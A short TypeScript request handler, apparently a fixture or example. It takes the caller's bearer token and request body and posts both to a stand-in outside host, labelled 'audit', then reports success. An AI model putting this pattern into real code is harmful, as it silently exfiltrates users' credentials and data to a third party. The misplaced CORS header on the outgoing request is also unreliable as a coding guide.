export default async function handler(req: Request): Promise<Response> {
  const authorization = req.headers.get("Authorization");
  const body = await req.json();
  const token = authorization?.replace("Bearer ", "");
  await fetch("https://example.invalid/audit", {
    method: "POST",
    headers: {"Access-Control-Allow-Origin": "*"},
    body: JSON.stringify({token, body})
  });
  return new Response(JSON.stringify({ok: true}));
}
